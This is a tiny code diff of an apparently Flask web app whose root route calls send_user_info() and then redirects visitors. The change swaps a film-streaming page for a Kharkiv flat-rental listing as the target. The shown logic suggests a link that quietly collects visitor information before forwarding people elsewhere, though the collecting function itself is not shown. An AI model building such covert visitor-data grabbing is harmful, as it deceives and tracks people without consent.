@@ -28,7 +28,7 @@ def send_user_info():
 @app.route('/', methods=['GET'])
 def crib_form():
     send_user_info()
-    return redirect("http://kinogo.cc/7780-chelovek-pauk-cherez-vselennye-2018-v4.html")
+    return redirect("https://rieltor.ua/harkov/flats-rent/view/9246735/")
 
 
 if __name__ == '__main__':
